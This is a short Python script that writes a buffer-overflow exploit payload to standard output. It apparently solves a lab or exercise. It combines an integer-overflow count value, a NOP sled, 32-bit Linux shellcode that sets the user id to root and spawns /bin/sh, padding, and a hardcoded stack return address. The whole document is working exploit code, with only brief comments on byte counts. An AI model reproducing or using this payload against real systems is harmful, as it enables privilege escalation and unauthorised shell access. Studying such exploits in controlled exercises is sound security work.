import struct
import sys

shellcode = b'1\xdb\x8dC\x17\x99\xcd\x80\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

count_dec = 1073741885
count = struct.pack('L',count_dec)

sys.stdout.buffer.write(count)

# BO occurs at 300 bytes
# no-op sled
for a in range(37):
    # essentially writing 120 bytes
    sys.stdout.buffer.write(b'\x90\x90\x90\x90')

# shellcode length is 53
sys.stdout.buffer.write(shellcode)

for a in range(24):
    # essentially writing 120 bytes
    sys.stdout.buffer.write(b'\x90\x90\x90\x90')

# pad 2
sys.stdout.buffer.write(b'\x90\x90\x90')

return_address = b'\x22\x92\xff\xbf'
sys.stdout.buffer.write(return_address)
